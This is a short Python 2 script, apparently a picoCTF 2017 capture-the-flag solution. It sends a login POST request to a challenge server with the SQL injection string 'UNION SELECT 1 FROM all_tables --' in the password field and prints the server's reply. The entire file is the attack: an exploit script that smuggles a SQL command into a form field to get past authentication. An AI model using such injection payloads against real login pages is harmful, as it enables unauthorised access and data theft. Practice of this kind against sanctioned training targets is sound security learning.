import httplib, urllib

params = urllib.urlencode({'username': '12524', 'password': "UNION SELECT 1 FROM all_tables --"})
headers = {"Content-type": "application/x-www-form-urlencoded",
            "Accept": "text/plain"}
conn = httplib.HTTPConnection("shell2017.picoctf.com:23598")
conn.request("POST", "/login", params, headers)
response = conn.getresponse()
#print response.status, response.reason

data = response.read()
print data

conn.close()